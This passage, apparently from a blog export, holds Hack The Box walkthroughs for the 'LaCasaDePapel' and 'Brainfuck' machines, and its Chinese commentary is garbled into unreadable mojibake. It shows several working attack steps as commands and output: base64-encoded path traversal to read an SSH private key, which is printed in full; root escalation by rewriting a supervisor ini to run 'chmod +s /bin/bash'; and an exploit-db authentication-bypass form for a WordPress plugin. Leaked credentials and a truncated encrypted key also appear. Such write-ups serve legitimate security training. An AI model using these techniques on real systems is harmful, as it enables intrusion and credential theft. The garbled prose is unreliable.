çš„\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# echo U0VBU09OLTEvMDEuYXZp|base64 -d             \nSEASON-1/01.avi\n```\næ˜¯çš„ï¼Œæ˜¯ base64ï¼Œé‚£æˆ‘ä»¬ä¹ŸæŠŠéœ€è¦è¯»å–çš„æ–‡ä»¶åè½¬æ¢ä¸º base64 å°±å¥½äº†\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# echo -n ../.ssh/id_rsa|base64\nLi4vLnNzaC9pZF9yc2E=\n```\nç„¶åå†å»è¯»å–\n\n```bash\nhttps://10.10.10.131/file/Li4vLnNzaC9pZF9yc2E=\n```\n```bash\n-----BEGIN OPENSSH PRIVATE KEY-----\n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\n-----END OPENSSH PRIVATE KEY-----\n```\næˆåŠŸè·å–åˆ°äº†å¯†é’¥\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ssh berlin@10.10.10.131 -i id_rsa\nberlin@10.10.10.131's password: \n```\nä½†æ˜¯è¿™é‡Œä½¿ç”¨ berlin è´¦æˆ·ç™»å½•å´ä¸è¡Œ\n\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# ssh professor@10.10.10.131 -i id_rsa\n\n _             ____                  ____         ____                  _ \n| |    __ _   / ___|__ _ ___  __ _  |  _ \\  ___  |  _ \\ __ _ _ __   ___| |\n| |   / _` | | |   / _` / __|/ _` | | | | |/ _ \\ | |_) / _` | '_ \\ / _ \\ |\n| |__| (_| | | |__| (_| \\__ \\ (_| | | |_| |  __/ |  __/ (_| | |_) |  __/ |\n|_____\\__,_|  \\____\\__,_|___/\\__,_| |____/ \\___| |_|   \\__,_| .__/ \\___|_|\n                                                            |_|       \n\nlacasadepapel [~]$ whoami&&id\nprofessor\nuid=1002(professor) gid=1002(professor) groups=1002(professor)\n```\næœ€åä½¿ç”¨ professor ç”¨æˆ·å€’æ˜¯æˆåŠŸè¿›å»äº†\n\n# æƒé™æå‡\n```bash\nlacasadepapel [~]$ ls -la\ntotal 24\ndrwxr-sr-x 4 professor professor 4096 Mar  6  2019 .\ndrwxr-xr-x 7 root      root      4096 Feb 16  2019 ..\nlrwxrwxrwx 1 root      professor    9 Nov  6  2018 .ash_history -> /dev/null\ndrwx------ 2 professor professor 4096 Jan 31  2019 .ssh\n-rw-r--r-- 1 root      root        88 Jan 29  2019 memcached.ini\n-rw-r----- 1 root      nobody     434 Jan 29  2019 memcached.js\ndrwxr-sr-x 9 root      professor 4096 Oct  3 13:13 node_modules\n```\nè¿™è¾¹çœ‹åˆ°æœ‰ä¸€ä¸ª memcached.ini çš„æ–‡ä»¶ï¼Œæ˜¯å±äº root çš„ï¼Œä½†æ˜¯åœ¨æˆ‘ä»¬çš„ç›®å½•ï¼Œé‚£å’Œè‚¯å®šæ˜¯æœ‰å…³çš„ï¼Œæ°å·§æˆ‘ä»¬æœ‰è¯»å–æƒé™ï¼Œå»çœ‹ä¸€ä¸‹å†…å®¹\n\n```bash\nlacasadepapel [~]$ cat memcached.ini \n[program:memcached]\ncommand = sudo -u nobody /usr/bin/node /home/professor/memcached.js\n```\nä¼šä½¿ç”¨ sudo æƒé™è°ƒç”¨ nobody ç”¨æˆ·ä½¿ç”¨ node æ‰§è¡Œ memcached.js æ–‡ä»¶ï¼Ÿè¿™å¥—å¨ƒæœ‰ç‚¹å‰å®³\n\nä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰ç¼–è¾‘æƒé™ï¼Œé‚£ä¹ˆæ€ä¹ˆåŠå‘¢ï¼Ÿç›´æ¥ç»™å®ƒåˆ æ‰è‡ªå·±åˆ›å»ºä¸€ä¸ªå§\n\n```bash\n[program:memcached]\ncommand = chmod +s /bin/bash\n```\n```bash\nlacasadepapel [~]$ ls -la /bin/bash\n-rwxr-xr-x 1 root root 715008 May  1  2018 /bin/bash\nlacasadepapel [~]$ ls -la /bin/bash\n-rwsr-sr-x 1 root root 715008 May  1  2018 /bin/bash\n```\nç¨ç­‰ä¸€ä¼šå„¿åï¼Œæˆ‘ä»¬è¦çš„æ•ˆæœæ¥äº†ï¼Œææƒå»\n\n```bash\nlacasadepapel [~]$ /bin/bash -p\nlacasadepapel [~]$ whoami&&id\nroot\nuid=1002(professor) gid=1002(professor) euid=0(root) egid=0(root) groups=0(root),1002(professor)\n```\næˆåŠŸææƒåˆ° root æƒé™\n\n```bash\nlacasadepapel [~]$ cat /home/berlin/user.txt \nf61519de2e8afee5a22f8de3a88a0e6b\nlacasadepapel [~]$ cat /root/root.txt \n113f5e20d75aca2331511cdbe6319613\n```\næˆåŠŸæ‹¿åˆ° user æƒé™å’Œ root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Brainfuck - Hackthebox","url":"/2017/04/29/Hackthebox/Insane/Hackthebox-Brainfuck/","content":"\n# Hackthebox - Brainfuck\n# é¶åœºä¿¡æ¯\n![image](Hackthebox-Brainfuck/w1QjmTWutE_Q_eGxZHeLpzk8xDrvBKKmH_JNQOGtHVA.png)\n\n# é¶åœºç±»å‹\n![image](Hackthebox-Brainfuck/lcQDCP1bKxxs54vOU2-9TI5hyEqAaDtOv08XgWHkODw.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nmap -sS -sV -A -sC -p- --min-rate 10000 10.10.10.17\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-01-19 01:49 CST\nNmap scan report for 10.10.10.17\nHost is up (0.41s latency).\nNot shown: 65530 filtered tcp ports (no-response)\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 94d0b334e9a537c5acb980df2a54a5f0 (RSA)\n|   256 6bd5dc153a667af419915d7385b24cb2 (ECDSA)\n|_  256 23f5a333339d76d5f2ea6971e34e8e02 (ED25519)\n25/tcp  open  smtp     Postfix smtpd\n|_smtp-commands: brainfuck, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN\n110/tcp open  pop3     Dovecot pop3d\n|_pop3-capabilities: SASL(PLAIN) USER TOP AUTH-RESP-CODE CAPA RESP-CODES PIPELINING UIDL\n143/tcp open  imap     Dovecot imapd\n|_imap-capabilities: SASL-IR ENABLE LITERAL+ LOGIN-REFERRALS more listed ID capabilities have post-login Pre-login AUTH=PLAINA0001 IMAP4rev1 OK IDLE\n443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)\n|_http-title: Welcome to nginx!\n|_http-server-header: nginx/1.10.0 (Ubuntu)\n| tls-nextprotoneg: \n|_  http/1.1\n| tls-alpn: \n|_  http/1.1\n| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR\n| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb\n| Not valid before: 2017-04-13T11:19:29\n|_Not valid after:  2027-04-11T11:19:29\n|_ssl-date: TLS randomness does not represent time\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%), Linux 4.4 (92%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: Host:  brainfuck; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 110/tcp)\nHOP RTT       ADDRESS\n1   482.21 ms 10.10.16.1\n2   482.26 ms 10.10.10.17\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 88.32 seconds\n```\n```bash\nDNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb\n```\nè¿™è¾¹åˆä¸¤ä¸ªåŸŸåï¼Œå…ˆåŠ å…¥ hosts è§£æå§\n\n```bash\necho 10.10.10.17 brainfuck.htb www.brainfuck.htb sup3rs3cr3t.brainfuck.htb >> /etc/hosts\n```\n## Http\n![image](Hackthebox-Brainfuck/IJIhrWS8nI2tp6UnicuSy6G-QKaoznEhtDP659pN92I.png)\n\nç›´æ¥è®¿é—®æ˜¯ Nginx é»˜è®¤é¡µé¢\n\n![image](Hackthebox-Brainfuck/Z7f8IWs6g4QVsjG5zdEqAIJbDmpg1O7XGw2FUVaFK-0.png)\n\nä½¿ç”¨ hosts è§£æåè®¿é—®æ˜¯ä¸€ä¸ª wordpress é¡µé¢ï¼Œç‰ˆæœ¬æ˜¯ 4.7.3\n\nè¿™é‡Œçš„å†…å®¹æ˜¯ SMTP é›†æˆå·²å‡†å¤‡å°±ç»ªå—ï¼Œç„¶åç»™äº†æˆ‘ä»¬ä¸€ä¸ªé‚®ä»¶åœ°å€ï¼Œè®©æˆ‘ä»¬æ£€æŸ¥åæŠŠåé¦ˆå‘é€åˆ°è¿™ä¸ªåœ°å€\n\n```bash\norestis@brainfuck.htb\n```\nSMTP ä½¿ç”¨çš„ç«¯å£æ˜¯ 25 ç«¯å£ï¼Œè¿™é‡Œå…ˆè®°å½•ä¸€ä¸‹ï¼Œè¯´ä¸å®šæœ‰ç”¨\n\næ—¢ç„¶çŸ¥é“æ˜¯ wordpress äº†ï¼Œé‚£å°±ç”¨ wpscan å»æ‰«æä¸€ä¸‹\n\n## Wpscan\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# wpscan --url \"https://brainfuck.htb/\" --disable-tls-checks\n_______________________________________________________________\n         __          _______   _____\n         \\ \\        / /  __ \\ / ____|\n          \\ \\  /\\  / /| |__) | (___   ___  __ _ _ __ Â®\n           \\ \\/  \\/ / |  ___/ \\___ \\ / __|/ _` | '_ \\\n            \\  /\\  /  | |     ____) | (__| (_| | | | |\n             \\/  \\/   |_|    |_____/ \\___|\\__,_|_| |_|\n\n         WordPress Security Scanner by the WPScan Team\n                         Version 3.8.22\n       Sponsored by Automattic - https://automattic.com/\n       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart\n_______________________________________________________________\n\n[+] URL: https://brainfuck.htb/ [10.10.10.17]\n[+] Started: Thu Jan 19 02:01:26 2023\n\nInteresting Finding(s):\n\n[+] wp-support-plus-responsive-ticket-system\n | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/\n | Last Updated: 2019-09-03T07:57:00.000Z\n | [!] The version is out of date, the latest version is 9.1.2\n |\n | Found By: Urls In Homepage (Passive Detection)\n |\n | Version: 7.1.3 (80% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt\n```\nå‘ç°ä¸€ä¸ªè€ç‰ˆæœ¬æ’ä»¶\n\n> [https://www.exploit-db.com/exploits/41006](https://www.exploit-db.com/exploits/41006)\n\næœç´¢è¿™ä¸ªæ’ä»¶æ‰¾åˆ°äº†ä¸€ä¸ªå¯åˆ©ç”¨çš„æ¼æ´\n\n# æ¼æ´åˆ©ç”¨\n```bash\n<form method=\"post\" action=\"https://brainfuck.htb/wp-admin/admin-ajax.php\">\n\tUsername: <input type=\"text\" name=\"username\" value=\"admin\">\n\t<input type=\"hidden\" name=\"email\" value=\"orestis@brainfuck.htb\">\n\t<input type=\"hidden\" name=\"action\" value=\"loginGuestFacebook\">\n\t<input type=\"submit\" value=\"Login\">\n</form>\n```\nå°†æˆ‘ä»¬çš„ poc ä¿å­˜åˆ°æœ¬åœ°ï¼Œç„¶åä½¿ç”¨ python3 å¼€å¯ä¸€ä¸ª http æœåŠ¡\n\n```python\npython3 -m http.server 80\n```\n![image](Hackthebox-Brainfuck/EU-H4CZQIy0CvpvDlDaLz0Hl07vHJ6XEvRBKb5b1LAc.png)\n\né€‰æ‹©ç™»å½•è¯•è¯•\n\n![image](Hackthebox-Brainfuck/bSd46BG9U5J5u9TeK37x8iplJ9b1acaQDCUIfNFDZXc.png)\n\nç‚¹å‡»åæ˜¯ä¸€ç‰‡ç©ºç™½é¡µé¢ï¼Œä¸ç¡®å®šæ˜¯å¦åˆ©ç”¨æˆåŠŸï¼Œè¿”å›ä¸»é¡µçœ‹çœ‹\n\n![image](Hackthebox-Brainfuck/Qh6aehvfNKPmALp6zfXvCSFZ30OEbIqalywHzRrvDyU.png)\n\nokï¼Œè¿™é‡Œæˆ‘ä»¬åˆ©ç”¨æˆåŠŸäº†ï¼Œå·²ç»æˆåŠŸç™»å½•\n\n![image](Hackthebox-Brainfuck/xHPTkKMbHhE_yzwBsU8vvCTYKAmWOiAYqwGOk2gNDQ4.png)\n\nåœ¨ Settings -> Easy WP SMTP ä¸­ï¼Œå¯ä»¥çœ‹åˆ° SMTP çš„ä¿¡æ¯ï¼Œè¿™é‡Œå¯†ç æ˜¯éšè—çš„\n\n![image](Hackthebox-Brainfuck/uORtmvFozO8iLMqmmodRV50Z3Lp7VYq1ymR0Fdg_iVY.png)\n\nä½¿ç”¨æ§åˆ¶å°å°±å¯ä»¥çœ‹åˆ°å¯†ç \n\n```bash\nSMTP\nEmail = orestis@brainfuck.htb\nusername = orestis\npassword = kHGuERB29DNiNE\n```\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# nc 10.10.10.17 110\n+OK Dovecot ready.\nUSER orestis\n+OK\nPASS kHGuERB29DNiNE\n+OK Logged in.\nlist\n+OK 2 messages:\n1 977\n2 514\n.\nretr 1\n+OK 977 octets\nReturn-Path: <www-data@brainfuck.htb>\nX-Original-To: orestis@brainfuck.htb\nDelivered-To: orestis@brainfuck.htb\nReceived: by brainfuck (Postfix, from userid 33)\n        id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)\nTo: orestis@brainfuck.htb\nSubject: New WordPress Site\nX-PHP-Originating-Script: 33:class-phpmailer.php\nDate: Mon, 17 Apr 2017 17:15:40 +0000\nFrom: WordPress <wordpress@brainfuck.htb>\nMessage-ID: <00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb>\nX-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\n\nYour new WordPress site has been successfully set up at:\n\nhttps://brainfuck.htb\n\nYou can log in to the administrator account with the following information:\n\nUsername: admin\nPassword: The password you chose during the install.\nLog in here: https://brainfuck.htb/wp-login.php\n\nWe hope you enjoy your new site. Thanks!\n\n--The WordPress Team\nhttps://wordpress.org/\n.\nretr 2\n+OK 514 octets\nReturn-Path: <root@brainfuck.htb>\nX-Original-To: orestis\nDelivered-To: orestis@brainfuck.htb\nReceived: by brainfuck (Postfix, from userid 0)\n        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)\nTo: orestis@brainfuck.htb\nSubject: Forum Access Details\nMessage-Id: <20170429101206.4227420AEB@brainfuck>\nDate: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)\nFrom: root@brainfuck.htb (root)\n\nHi there, your credentials for our \"secret\" forum are below :)\n\nusername: orestis\npassword: kIEnnfEKJ#9UmdO\n\nRegards\n.\n```\nå¾—åˆ°äº†ä¸¤å°é‚®ä»¶\n\n```bash\nReturn-Path: <www-data@brainfuck.htb>\nX-Original-To: orestis@brainfuck.htb\nDelivered-To: orestis@brainfuck.htb\nReceived: by brainfuck (Postfix, from userid 33)\n        id 7150023B32; Mon, 17 Apr 2017 20:15:40 +0300 (EEST)\nTo: orestis@brainfuck.htb\nSubject: New WordPress Site\nX-PHP-Originating-Script: 33:class-phpmailer.php\nDate: Mon, 17 Apr 2017 17:15:40 +0000\nFrom: WordPress <wordpress@brainfuck.htb>\nMessage-ID: <00edcd034a67f3b0b6b43bab82b0f872@brainfuck.htb>\nX-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\n\nYour new WordPress site has been successfully set up at:\n\nhttps://brainfuck.htb\n\nYou can log in to the administrator account with the following information:\n\nUsername: admin\nPassword: The password you chose during the install.\nLog in here: https://brainfuck.htb/wp-login.php\n\nWe hope you enjoy your new site. Thanks!\n\n--The WordPress Team\nhttps://wordpress.org/\n```\n```bash\nReturn-Path: <root@brainfuck.htb>\nX-Original-To: orestis\nDelivered-To: orestis@brainfuck.htb\nReceived: by brainfuck (Postfix, from userid 0)\n        id 4227420AEB; Sat, 29 Apr 2017 13:12:06 +0300 (EEST)\nTo: orestis@brainfuck.htb\nSubject: Forum Access Details\nMessage-Id: <20170429101206.4227420AEB@brainfuck>\nDate: Sat, 29 Apr 2017 13:12:06 +0300 (EEST)\nFrom: root@brainfuck.htb (root)\n\nHi there, your credentials for our \"secret\" forum are below :)\n\nusername: orestis\npassword: kIEnnfEKJ#9UmdO\n\nRegards\n```\nå¾—åˆ°äº†ä¸€ä¸ªè´¦å·å¯†ç \n\n```bash\nusername: orestis\npassword: kIEnnfEKJ#9UmdO\n```\n## sup3rs3cr3t.brainfuck.htb\næˆ‘ä»¬çœ‹ä¸€ä¸‹å¦ä¸€ä¸ªåœ°å€æ˜¯ä»€ä¹ˆä¸œè¥¿\n\n![image](Hackthebox-Brainfuck/tEMSI4f2vu8qjZ9t7vY6TZXbPSaYRIrdf78x7a_CMZo.png)\n\nä¼¼ä¹æ˜¯ä¸€ä¸ªè®ºå›\n\nç”¨æˆ‘ä»¬åˆšæ‰çš„è´¦å·å¯†ç å»ç™»å½•è¯•è¯•\n\n![image](Hackthebox-Brainfuck/QSDQ513DvaMR1D3OkgqKt9F1dAp-QcO_W4opwPUCw9M.png)\n\næˆåŠŸç™»å½•\n\n![image](Hackthebox-Brainfuck/_97op-mMV5alIc3g4S8PV13Y8heF_6vtmJbx4elmMXo.png)\n\nè¿™é‡Œçš„å¯¹è¯æœ‰ç‚¹æ„æ€ï¼Œå°±æ˜¯æœ‰ä¸ªäººéª‚ç®¡ç†å‘˜ï¼Œèµ¶å¿«æŠŠå¯†é’¥å‘ç»™æˆ‘ã€‚ç®¡ç†å‘˜è¯´ï¼Œä½ ä¸ªå°ç¢§æ± ï¼Œæˆ‘çœ‹ä½ ä¸€ç‚¹ç¤¼è²Œéƒ½æ²¡æœ‰ï¼Œä¿¡ä¸ä¿¡æˆ‘æŠŠå¯†é’¥è´´åœ¨è¿™é‡Œç»™å¤§å®¶ä¸‹è½½ã€‚ç„¶åé‚£ä¸ªäººè¯´ä»–å¼€äº†ä¸€ä¸ªæ–°çš„åŠ å¯†é€šè¯çš„å¸–å­\n\n![image](Hackthebox-Brainfuck/FwcY-auxq_q2ObyeBAitikbc2UamHHdsba6UHoF7AUc.png)\n\n### å¯†ç è§£å¯†\næˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå¯¹è¯å·²ç»è¢«åŠ å¯†äº†ï¼Œç„¶åæˆ‘æ‰¾äº†ä¸€ä¸ªè§£å¯†çš„ç½‘ç«™\n\n> [https://planetcalc.com/2468/](https://planetcalc.com/2468/)\n\n![image](Hackthebox-Brainfuck/-202FdDx0kJnTv_7p9pUQV-6kIJsXGP3brulp4awD1U.png)\n\n```bash\nbrainfu - ckmybra inf uck myb rainfu\n```\nç„¶åæˆ‘ä»¬å…ˆåˆ é™¤æ‰€æœ‰çš„ç‰¹æ®Šå­—ç¬¦\n\n```bash\nbrainfuckmybrainfuckmybrainfu\n```\næˆ‘ä»¬å»å°è¯•è§£å¯†ï¼Œå¯ä»¥ç¡®å®šçš„æ˜¯\n\n```bash\nmnvze://zsrivszwm.rfz/8cr5ai10r915218697i1w658enqc0cs8/ozrxnkc/ub_sja\n```\nè¿™ä¸€æ®µè‚¯å®šæ˜¯ä¸€ä¸ªç½‘å€ï¼Œæ‰€ä»¥æˆ‘ä»¬çœ‹çœ‹è¿™ä¸€æ®µå¯†ç æ€ä¹ˆè§£å¯†æ‰èƒ½è®©å®ƒå˜æˆç½‘å€\n\n![image](Hackthebox-Brainfuck/xRPxSL5VEhrI8YYxDZeeqCyMUSiIgBpikBAP3KVMdek.png)\n\n```bash\nfuckmybrain\n\nhttps://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa\n```\næœ€åå¾—å‡ºäº†å¯†é’¥å’Œåœ°å€\n\n### ç§é’¥è§£å¯†\n```bash\nâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]\nâ””â”€# cat id_rsa    \n-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nDEK-Info: AES-128-CBC,6904FEF19397786F75BE2D7762AE7382\n\nmneag/YCY8AB+OLdrgtyKqnrdTHwmpWGTNW9pfhHsNz8CfGdAxgchUaHeoTj/rh/\nB2nS4+9CYBK8IR3Vt5Fo7PoWBCjAAwWYlx+cK0w1DXqa3A+BLlsSI0Kws9jea6Gi\nW1ma/V7WoJJ+V4JNI7ufThQyOEUO76PlYNRM9UEF8MANQmJK37Md9Ezu53wJpUqZ\n7dKcg6AM/o9VhOlpiX7SINT9dRKaKevOjopRbyEFMliP01H7ZlahWPdRRmfCXSmQ\nzxH9I2lGIQTtRRA3rFktLpNedNPuZQCSswUec7eVVt2mc2Zv9PM9lCTJuRSzzVum\noz3XEnhaGmP1jmMoVBWiD+2RrnL6wnz9kssV+tgCV0mD97WS+1ydWEPeCph06Mem\ndLR2L1uvBGJev8i9hP3thp1owvM8HgidyfMC2vOBvXbcAA3bDKvR4jsz2obf5AF+\nFvt6pmMuix8hbipP112Us54yTv/hyC+M5g1hWUuj5y4xovgr0LLfI2pGe+Fv5lXT\nmcznc1ZqDY5lrlmWzTvsW7h7rm9LKgEiHn9gGgqiOlRKn5FUl+DlfaAMHWiYUKYs\nLSMVvDI6w88gZb102KD2k4NV0P6OdXICJAMEa1mSOk/LS/mLO4e0N3wEX+NtgVbq\nul9guSlobasIX5DkAcY+ER3j+/YefpyEnYs+/tfTT1oM+BR3TVSlJcOrvNmrIy59\nkrKVtulxAejVQzxImWOUDYC947TXu9BAsh0MLoKtpIRL3Hcbu+vi9L5nn5LkhO/V\ngdMyOyATor7Amu2xb93OO55XKkB1liw2rlWg6sBpXM1WUgoMQW50Keo6O0jzeGfA\nVwmM72XbaugmhKW25q/46/yL4VMKuDyHL5Hc+Ov5v3bQ908p+Urf04dpvj9SjBzn\nschqozogcC1UfJcCm6cl+967GFBa3rD5YDp3x2xyIV9SQdwGvH0ZIcp0dKKkMVZt\nUX8hTqv1ROR4Ck8G1zM6Wc4QqH6DUqGi3tr7nYwy7wx1JJ6WRhpyWdL+su8f96Kn\nF7gwZLtVP87d8R3uAERZnxFO9MuOZU2+PEnDXdSCSMv3qX9FvPYY3OPKbsxiAy+M\nwZezLNip80XmcVJwGUYsdn+iB/UPMddX12J30YUbtw/R34TQiRFUhWLTFrmOaLab\nIql5L+0JEbeZ9O56DaXFqP3gXhMx8xBKUQax2exoTreox